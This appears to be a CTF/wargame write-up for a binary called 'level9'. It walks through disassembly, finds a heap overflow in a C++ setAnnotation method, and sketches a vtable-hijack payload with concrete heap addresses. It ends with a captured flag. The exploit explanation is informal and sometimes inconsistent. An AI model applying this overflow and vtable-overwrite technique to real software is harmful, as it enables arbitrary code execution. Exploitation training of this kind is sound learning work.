let's start to exec the sowftware :
./level9

is make nothing 

so let's deep dive inside the disassemble 


push    ebp
mov     ebp, esp
push    ebx
and     esp, 0FFFFFFF0h
sub     esp, 20h
cmp     [ebp+argc], 1
jg      short loc_8048610


is look that so the programm need one argument to exec 


so let's try with one argument :
./level9 a 

but make nothing too

so let's try to decompile the software to look what is make
loc_8048610:            ; unsigned int
mov     dword ptr [esp], 108
call    __Znwj          ; operator new(uint)
mov     ebx, eax
mov     dword ptr [esp+4], 5 ; int
mov     [esp], ebx      ; this
call    _ZN1NC2Ei       ; N::N(int)
mov     [esp+28], ebx
mov     dword ptr [esp], 108 ; unsigned int
call    __Znwj          ; operator new(uint)
mov     ebx, eax
mov     dword ptr [esp+4], 6 ; int
mov     [esp], ebx      ; this
call    _ZN1NC2Ei       ; N::N(int)
mov     [esp+24], ebx
mov     eax, [esp+28]
mov     [esp+20], eax
mov     eax, [esp+24]
mov     [esp+16], eax
mov     eax, [ebp+argv]
add     eax, 4
mov     eax, [eax]
mov     [esp+4], eax    ; s
mov     eax, [esp+20]
mov     [esp], eax      ; this
call    _ZN1N13setAnnotationEPc ; N::setAnnotation(char *)
mov     eax, [esp+16]
mov     eax, [eax]
mov     edx, [eax]
mov     eax, [esp+20]
mov     [esp+4], eax
mov     eax, [esp+16]
mov     [esp], eax
call    edx
mov     ebx, [ebp+var_4]
leave
retn
; } // starts at 80485F4
main endp



actually is like cpp 
and this cpp have 2 class N

is create two instance of the class N

mov     [esp+4], eax    ; s
mov     eax, [esp+20]
mov     [esp], eax      ; this
call    _ZN1N13setAnnotationEPc ; N::setAnnotation(char *)
mov     eax, [esp+16]

and set the annotation of the first instance with the second argument


mov eax, [esp+16] retrieves the pointer to the second N object (the one created with the value 6).
mov eax, [eax] reads the first field of that object — this is the pointer to its vtable (the table of virtual methods).
mov edx, [eax] takes the first entry from this vtable (which corresponds to N::operator+) and stores it in edx.

mov eax, [esp+20] retrieves the pointer to the first N object (the one with the value 5).
mov [esp+4], eax prepares this pointer as the second argument.
mov eax, [esp+16] / mov [esp], eax places the second object as the first argument (this).

call edx then calls the function pointed to by the vtable — it’s a virtual call where the second object invokes one of its methods, passing the first object as a parameter.

After the call, execution flow returns to the function’s epilogue (mov ebx, ... ; leave).


so actually in the N class the function with setAnnotation


this= dword ptr  8
s= dword ptr  0Ch

; __unwind {
push    ebp
mov     ebp, esp
sub     esp, 24
mov     eax, [ebp+s]
mov     [esp], eax      ; s
call    _strlen
mov     edx, [ebp+this]
add     edx, 4
mov     [esp+8], eax    ; n
mov     eax, [ebp+s]
mov     [esp+4], eax    ; src
mov     [esp], edx      ; dest
call    _memcpy
leave
retn
; } // starts at 804870E
_ZN1N13setAnnotationEPc endp


is a big issue because is check the size but if not check the max size of the string in the stack

and the stack is actually of 

; __unwind {
push    ebp
mov     ebp, esp
mov     eax, [ebp+this]
mov     dword ptr [eax], offset off_8048848
mov     eax, [ebp+this]
mov     edx, [ebp+arg_4]
mov     [eax+104], edx
pop     ebp
retn
; } 


so the stack is actually of 104 octet
so if we write more than 104 octet in the stack we will overwrite the next variable


so now is time to exploit the software
the payload is like that

but because is a virtual call is need to write the address of the function in the stack
so the payload is like that



[ NOP Sled of 104 octet ] + 
[ shellcode ] + 
[ address of the function ] + 
[ address of the first object ]


but how to get the address of the function 
just launch gdb and look the addr of the stack of where the buffer is write

$esp   : 0xffffc9e0  →  0x0804d3b4  →  "AAAA"


so the addr of the stack is 0x0804d3b4 and the next so + 4  is 0x0804d3b8

but i try in min laptop and i don't have the same addr so i try a second time in the vm :
(gdb) x/wx $esp+28
0xbffff72c:     0x0804a008
(gdb) x/8wx 0x0804a008
0x804a008:      0x08048848      0x00000000      0x00000000      0x00000000
0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000
(gdb) ni
0x0804867c in main ()
(gdb) x/8wx 0x0804a008
0x804a008:      0x08048848      0x00000061      0x00000000      0x00000000
0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000



so the addr is 0x0804a008 +4 so 0x804a00c and the next so + 4 is 0x804a010



so the buffer is at 0x804a00c and the next so + 4 is 0x804a010
so the addr of the buffer is 0x804a00c

so the payload is like that

[ address of the shellcode ] + 
[ NOP Sled of 104 octet ] + 
[ shellcode ] + 
[ address of the first object ]


with addrese i look like that :
[ 0x804a010 ] + 
[ NOP Sled of 104 octet ] + 
[ shellcode ] + 
[ 0x804a00c ]

and let's try and get the flag !

f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728